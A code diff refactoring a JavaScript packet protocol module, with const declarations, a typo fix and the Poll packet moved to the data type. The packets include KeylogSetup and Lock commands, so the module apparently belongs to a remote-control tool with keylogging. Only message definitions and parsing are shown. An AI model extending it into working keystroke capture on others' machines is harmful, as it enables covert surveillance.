@@ -44,7 +44,7 @@ class __Protocol {
   }
 
   toJSON () {
-    let data = {
+    const data = {
       packetType: this.packetType,
       messageType: this.messageType
     }
@@ -88,7 +88,7 @@ class _Data extends __Protocol {
 
 // packets
 
-let Packets = {}
+const Packets = {}
 
 Packets.KeepAlive = class KeepAlive extends _Connection {
   constructor () {
@@ -108,13 +108,6 @@ Packets.List = class List extends _Connection {
   constructor () {
     super(...arguments)
     this.messageType = _MessageType.List
-  }
-}
-
-Packets.Poll = class Poll extends _Connection {
-  constructor () {
-    super(...arguments)
-    this.messabgeType = _MessageType.Poll
   }
 }
 
@@ -149,7 +142,7 @@ Packets.Control = class Control extends _Control {
 Packets.KeylogSetup = class KeylogSetup extends _Control {
   constructor () {
     super(...arguments)
-    if (!this.data || !("interval" in this.data)) {
+    if (!this.data || !('interval' in this.data)) {
       this.data = {
         interval: 5 * 1000
       }
@@ -187,6 +180,13 @@ Packets.Lock = class Lock extends _Control {
 }
 
 // response
+
+Packets.Poll = class Poll extends _Data {
+  constructor () {
+    super(...arguments)
+    this.messageType = _MessageType.Poll
+  }
+}
 
 Packets.r_Hello = class r_Hello extends _Data {
   constructor () {
@@ -232,8 +232,6 @@ function _identifyPacket (rawPacket) {
           return Packets.Hello
         case _MessageType.List:
           return Packets.List
-        case _MessageType.Poll:
-          return Packets.Poll
       }
       break
     case _PacketType.Control:
@@ -260,6 +258,8 @@ function _identifyPacket (rawPacket) {
       break
     case _PacketType.Data:
       switch (rawPacket.messageType) {
+        case _MessageType.Poll:
+          return Packets.Poll
         case _MessageType.r_Hello:
           return Packets.r_Hello
         case _MessageType.r_List:
@@ -279,7 +279,7 @@ function _identifyPacket (rawPacket) {
 
 function Parser (rawPacket) {
   try {
-    let PacketClass = _identifyPacket(rawPacket)
+    const PacketClass = _identifyPacket(rawPacket)
     return new PacketClass(rawPacket.data)
   } catch (e) {
     if (e) throw Error(`Bad packet: ${e}`)
